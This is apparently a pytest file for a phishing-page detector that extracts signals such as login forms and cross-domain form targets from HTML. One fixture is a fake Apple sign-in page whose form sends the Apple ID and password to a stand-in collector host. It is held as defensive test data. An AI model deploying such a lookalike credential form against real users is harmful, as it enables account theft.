from lookalike_hunter.capture.signals import extract_signals

PHISHING = """
<html><head><title>Sign in to your Apple Account</title></head>
<body>
  <form action="https://collector.evil-exfil.ru/save.php" method="post">
    <input type="text" name="appleid">
    <input type="password" name="pwd">
  </form>
</body></html>
"""

PARKED = """
<html><head><title>lcloud-verify.live is for sale</title></head>
<body><h1>Buy this domain</h1><iframe src="https://ads.example.com/a"></iframe></body></html>
"""


def test_detects_login_form_and_exfiltration_target() -> None:
    s = extract_signals(PHISHING, "https://appleid-security.com/login")

    assert s.title == "Sign in to your Apple Account"
    assert s.has_login_form
    assert s.has_password_input
    assert s.password_input_count == 1
    assert s.cross_domain_form_targets == ["evil-exfil.ru"]


def test_parked_page_has_no_login_form() -> None:
    s = extract_signals(PARKED, "https://lcloud-verify.live/")

    assert not s.has_login_form
    assert s.form_count == 0
    assert s.iframe_count == 1


def test_same_site_form_action_is_not_cross_domain() -> None:
    html = '<form action="https://www.shop.example.com/login"><input type="password"></form>'
    s = extract_signals(html, "https://shop.example.com/")
    assert s.cross_domain_form_targets == []


def test_relative_form_action_is_not_cross_domain() -> None:
    html = '<form action="/submit"><input type="password" name="p"></form>'
    assert extract_signals(html, "https://x.com/").cross_domain_form_targets == []


def test_credential_field_without_password_type() -> None:
    # Kits hide the real field behind type="text" plus JS masking.
    html = '<form><input type="text" name="user_password_1"></form>'
    s = extract_signals(html, "https://x.com/")
    assert not s.has_password_input
    assert s.has_credential_field
    assert s.has_login_form


def test_malformed_html_does_not_raise() -> None:
    s = extract_signals("<html><form><input type=password", "https://x.com/")
    assert s.form_count == 1


def test_empty_html() -> None:
    s = extract_signals("", "https://x.com/")
    assert s.title is None and not s.has_login_form
